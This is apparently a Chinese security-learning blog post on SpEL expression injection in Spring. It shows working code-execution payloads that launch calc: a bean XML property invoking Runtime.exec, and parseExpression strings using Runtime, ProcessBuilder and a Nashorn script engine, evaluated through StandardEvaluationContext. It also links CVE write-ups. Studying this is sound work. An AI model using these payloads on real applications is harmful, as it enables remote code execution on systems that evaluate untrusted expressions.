---
title: "spEL表达式注入"
onlyTitle: true
date: 2024-10-14 9:30:23
categories:
- java
- java杂谈
tags:
- SPEL表达式注入
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8107.jpg
---

学C3P0不会jackson，然后滚去学jackson了

学jackson不会spEL，然后滚去学spEL了

学SpEL不会spring，然后滚来学spring了

### spring

spring提供了很多种从xml文件实例化bean的方法。虽然这只是spring的一小部分功能，但这是学java安全的一大部分了（hh

xml的模板如下，每个xml至少都会包括以下内容，算是个规范

```java
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        https://www.springframework.org/schema/beans/spring-beans.xsd">
		...
        ...

</beans>
```



剩下的见5tooc3a blog springRe0：

https://www.yuque.com/5tooc3a/jas/vwovvqh6w86ifrye#

写的非常好，好的我挑不出哪里需要重写，为防止网站挂掉，转载到blog了

## SeEL简介

在 spring3 中引入了 spring 表达式语言(Spring Expression Language)

主要作用是对于基于 XML 文件或者基于注解的 Spring 配置的装载。也就是对IOC容器中的javaBean进行动态属性状态和提取。

SpEL表达式定界符为`#{}`，加载外部属性文件还能用`${}`

pom.xml：

```xml
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>5.3.28</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-expression</artifactId>
            <version>5.3.28</version>
        </dependency>
        <dependency>
            <groupId>commons-logging</groupId>
            <artifactId>commons-logging</artifactId>
            <version>1.2</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-beans</artifactId>
            <version>5.3.28</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-context</artifactId>
            <version>5.3.28</version>
        </dependency>
```

同样能看：

https://www.yuque.com/5tooc3a/jas/tgmsxhgzn4a615sx#

spEL解析所需的依赖为spring-expression包

### xml文档注入

spring最基础的解析xml，可以用`#{}`表达式搭配`T()`使用其他类的静态方法

`T()`能获取到基础类（并不能实例化），之后就可以调用该类的静态方法

Person类：

```java
public class Person {
    private String name;
    private int age;

    public Person() {
    }

    public String getName() {
        System.out.println(name);
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}
```

比如`Runtime.getRuntime().exec`：

```java
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="Person" class="org.exploit.othercase.SpEL.Person">
        <property name="name" value="#{T(java.lang.Runtime).getRuntime().exec('calc')}" />
        <property name="age" value="#{1}" />
    </bean>
</beans>
```

beans.xml放到resources下，利用ClassPathXmlApplicationContext加载xml文档

```java
public class SpELcase {
    public static void main(String[] args) {
        ApplicationContext applicationContext=new ClassPathXmlApplicationContext("beans.xml");
        Person person=applicationContext.getBean("person",Person.class);
        person.getName();
    }
}
```

singleton模式下，Spring加载bean并调用setter进行依赖注入的行为发生在ClassPathXmlApplicationContext加载XML配置文件的过程中，具体来说：

* 加载配置文件阶段：
  当使用ClassPathXmlApplicationContext类来加载一个或多个XML配置文件时，Spring会解析这些配置文件中的bean定义，并将它们注册到IoC容器中。
* bean实例化与依赖注入：
  在这个过程中，对于每个bean，Spring会根据XML中定义的信息创建bean的实例。
  如果bean定义中包含了属性及其setter方法，则Spring会调用这些setter方法来完成依赖注入。
* getBean方法：
  当通过getBean方法从应用上下文中请求某个bean时，Spring实际上是从已经初始化好的bean池中获取该bean的引用。
  此时，bean的实例化和依赖注入工作已经完成。

调用getBean只是从容器中获取已经准备好的bean实例。



singleton和prototype模式的区别：

对于singleton作用域的bean，Spring会在启动时创建一个单例实例，并将其保存在容器中。
对于prototype作用域的bean，Spring不会在启动时创建实例，而是在每次调用getBean方法时创建一个新的实例。

### SpelExpressionParser 注入

SpelExpressionParser.parseExpression进行Spel解析，直接注，无需`#{}`

```java
public class ExpressionTest {
    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression("T(java.lang.Runtime).getRuntime().exec('calc')");
        EvaluationContext context = new StandardEvaluationContext();
        expression.getValue(context);
    }
}
```

调用getValue触发表达式的执行

甚至可以直接new对象：

* ProcessBuilder：

```java
Expression expression = parser.parseExpression("new java.lang.ProcessBuilder(new String[]{\"calc\"}).start()");
```

* ScriptEngineManager

```java
Expression expression = parser.parseExpression("new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")");
```



spring cloud gateway SpEL表达式注入CVE-2022-22947：

https://godownio.github.io/2023/04/19/spring-cloud-gateway-cve-2022-22947-spel-biao-da-shi-zhu-ru/

jackson SpEL注入CVE-2017-17485

